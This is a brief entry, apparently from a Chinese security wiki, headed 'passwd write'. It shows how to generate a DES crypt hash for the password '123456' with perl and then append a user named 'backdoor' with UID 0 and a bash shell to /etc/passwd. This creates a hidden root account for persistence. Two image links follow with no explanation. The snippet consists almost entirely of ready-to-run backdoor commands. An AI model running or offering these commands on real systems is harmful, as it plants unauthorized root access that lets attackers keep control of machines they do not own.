## passwd写入

```bash
perl -e 'print crypt("123456", "AA"). "\n"'
echo "backdoor:AASwmzPNx.3sg:0:0:me:/root:/bin/bash">>/etc/passwd

```

![](images/security_wiki/15905814013186.png)


![](images/security_wiki/15905814053023.png)


